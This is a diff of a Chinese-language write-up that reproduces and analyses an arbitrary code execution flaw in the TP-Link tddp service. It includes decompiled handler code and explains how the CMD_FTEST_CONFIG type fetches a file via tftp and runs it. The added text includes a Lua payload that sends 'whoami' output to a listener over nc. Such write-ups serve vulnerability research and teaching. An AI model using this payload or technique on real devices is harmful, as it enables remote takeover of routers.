@@ -96,7 +96,7 @@ python -m SimpleHTTPServer 80
 然后在qemu虚拟机中下载文件系统:
 
 ```text
-wget http://192.168.10.1/squashfs-root.tar.bz2
+wget http://10.10.10.1/squashfs-root.tar.bz2
 tar jxf squashfs-root.tar.bz2
 ```
 
@@ -153,5 +153,152 @@ sudo systemctl start atftpd
 
 使用`sudo systemctl status atftpd`可查看服务状态。如果执行命令 `sudo systemctl status atftpd` 查看 atftpd 服务状态时，提示 `atftpd: can't bind port :69/udp` 无法绑定端口，可以执行 `sudo systemctl stop inetutils-inetd.service` 停用 `inetutils-inetd` 服务后，再执行 `sudo systemctl restart atftpd` 重新启动 atftpd 即可正常运行 atftpd。
 
+### 实际展示
+
 前面都是准备环境的环节，接着就是复现漏洞的真正操作部分了。
+
+首先是往ftp服务器的目录中写入payload文件，文件需由lua语言编写，且包含`config_test`函数，实现功能可以随意，此处使用nc连接。
+
+```text
+function config_test(config)
+  os.execute("whoami | nc  10.10.10.1 7777")
+end
+```
+
+接着在虚拟机中启动tddp程序。
+
+然后在宿主机中监听7777端口。
+
+最后执行poc，就可以看到nc连回的结果了，我后面使用pwntools重写了之前的poc，因此这里就不贴出poc了，在后面再给出链接。
+
+### 漏洞分析 <a id="toc-4"></a>
+
+根据漏洞描述以及相应的报告知道了漏洞出现在程序`tddp`中，搜索该程序，得到该程序的路径为`/usr/bin/tddp`，将该程序拖入IDA中进行分析。
+
+程序规模不大，看起来和一般的pwn题差不多，所以我也就从main函数开始看了，经过重命名的main函数如下。
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162059-c5733252-c4b5-1.png)
+
+关键代码在`tddp_task_handle`中，跟进去该函数，看到函数进行了内存的初始化以及socket的初始化，在端口1040进行了端口监听，同时也可以看到这些字符串也是poc执行代码中命令行界面中显示出来的字符串。
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162125-d50d5aee-c4b5-1.png)
+
+进入的关键函数为`tddp_type_handle`，跟进去该函数。
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162142-df1774b6-c4b5-1.png)
+
+可以看到该在代码里首先使用`recvfrom`接收了最多0xAFC8字节的数据，然后判断第一个字节是否为1或2，根据前面说明的tddp协议的格式，知道第一个字节为`version`字段。图中截出的为`version`为1的情况，进入到`tddp_version1_type_handle`函数中。跟进去该函数。
+
+```text
+int __fastcall tddp_version1_type_handle(tddp_ctx *ctx, _DWORD *count)
+{
+  uint32_t v2; // r0
+  __int16 v3; // r2
+  uint32_t v4; // r0
+  __int16 v5; // r2
+  _DWORD *v7; // [sp+0h] [bp-24h]
+  char *v9; // [sp+Ch] [bp-18h]
+  char *v10; // [sp+10h] [bp-14h]
+  int v11; // [sp+1Ch] [bp-8h]
+
+  v7 = count;
+  v10 = ctx->rev_buff;
+  v9 = ctx->some_buff;
+  ctx->some_buff[0] = 1;
+  switch ( ctx->rev_buff[1] )                   // check type
+  {
+    case 4:
+      printf("[%s():%d] TDDPv1: receive CMD_AUTO_TEST\n", "tddp_parserVerOneOpt", 697);
+      v11 = CMD_AUTO_TEST(ctx);
+      break;
+    case 6:
+      printf("[%s():%d] TDDPv1: receive CMD_CONFIG_MAC\n", 103928, 638);
+      v11 = CMD_CONFIG_MAC(ctx);
+      break;
+    case 7:
+      printf("[%s():%d] TDDPv1: receive CMD_CANCEL_TEST\n", "tddp_parserVerOneOpt", 648);
+      v11 = CMD_CANCEL_TEST(ctx);
+      if ( !ctx || !(ctx->field_2C & 4) || !ctx || !(ctx->field_2C & 8) || !ctx || !(ctx->field_2C & 0x10) )
+        ctx->field_2C &= 0xFFFFFFFD;
+      ctx->rev_flag = 0;
+      ctx->field_2C &= 0xFFFFFFFE;
+      break;
+    case 8:
+      printf("[%s():%d] TDDPv1: receive CMD_REBOOT_FOR_TEST\n", "tddp_parserVerOneOpt", 702);
+      ctx->field_2C &= 0xFFFFFFFE;
+      v11 = 0;
+      break;
+    case 0xA:
+      printf("[%s():%d] TDDPv1: receive CMD_GET_PROD_ID\n", 103928, 643);
+      v11 = CMD_GET_PROD_ID(ctx);
+      break;
+    case 0xC:
+      printf("[%s():%d] TDDPv1: receive CMD_SYS_INIT\n", 103928, 615);
+      if ( ctx && ctx->field_2C & 2 )
+      {
+        v9[1] = 4;
+        v9[3] = 0;
+        v9[2] = 1;
+        v2 = htonl(0);
+        *((_WORD *)v9 + 2) = v2;
+        v9[6] = BYTE2(v2);
+        v9[7] = HIBYTE(v2);
+        v3 = ((unsigned __int8)v10[9] << 8) | (unsigned __int8)v10[8];
+        v9[8] = v10[8];
+        v9[9] = HIBYTE(v3);
+        v11 = 0;
+      }
+      else
+      {
+        ctx->field_2C &= 0xFFFFFFFE;
+        v11 = -10411;
+      }
+      break;
+    case 0xD:
+      printf("[%s():%d] TDDPv1: receive CMD_CONFIG_PIN\n", 103928, 682);
+      v11 = CMD_CONFIG_PIN(ctx);
+      break;
+    case 0x30:
+      printf("[%s():%d] TDDPv1: receive CMD_FTEST_USB\n", 103928, 687);
+      v11 = CMD_FTEST_USB(ctx);
+      break;
+    case 0x31:
+      printf("[%s():%d] TDDPv1: receive CMD_FTEST_CONFIG\n", "tddp_parserVerOneOpt", 692);
+      v11 = CMD_FTEST_CONFIG(ctx);
+      break;
+    default:
+      printf("[%s():%d] TDDPv1: receive unknown type: %d\n", 103928, 713, (unsigned __int8)ctx->rev_buff[1], count);
+      v9[1] = v10[1];
+      v9[3] = 2;
+      v9[2] = 2;
+      v4 = htonl(0);
+      *((_WORD *)v9 + 2) = v4;
+      v9[6] = BYTE2(v4);
+      v9[7] = HIBYTE(v4);
+      v5 = ((unsigned __int8)v10[9] << 8) | (unsigned __int8)v10[8];
+      v9[8] = v10[8];
+      v9[9] = HIBYTE(v5);
+      v11 = -10302;
+      break;
+  }
+  *v7 = ntohl(((unsigned __int8)v9[7] << 24) | ((unsigned __int8)v9[6] << 16) | ((unsigned __int8)v9[5] << 8) | (unsigned __int8)v9[4])
+      + 12;
+  return v11;
+```
+
+程序判断接收数据的第二字节，并根据其类型调用相关代码。根据协议格式，第二字节为`type`字段，同时根据poc，知道了出问题的类型为`0x31`。看上面的代码我们知道`0x31`对应为`CMD_FTEST_CONFIG`，看专利说明知道该字段为配置程序：
+
+```text
+[0049] For setting the configuration information and the configuration information, without subtype. Thus, this type of packet subtype SubType value is cleared (0x00)
+```
+
+跟进去该函数看是如何实现的：
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20190822162202-eb23edac-c4b5-1.png)
+
+可以看到该函数中就从数据中获取了字符串并形成命令`cd /tmp;tftp -gr %s %s`，即实现了使用`tftp`去连接过来的ip地址中下载相应的文件，并最终通过c代码调用该文件中的`config_test`函数，从而实现任意代码执行。
+
+事实上，根据最终使用的是`execve`函数来执行tftp下载，该漏洞也可以形成一个命令注入漏洞。
+
+至此，漏洞分析结束。
 
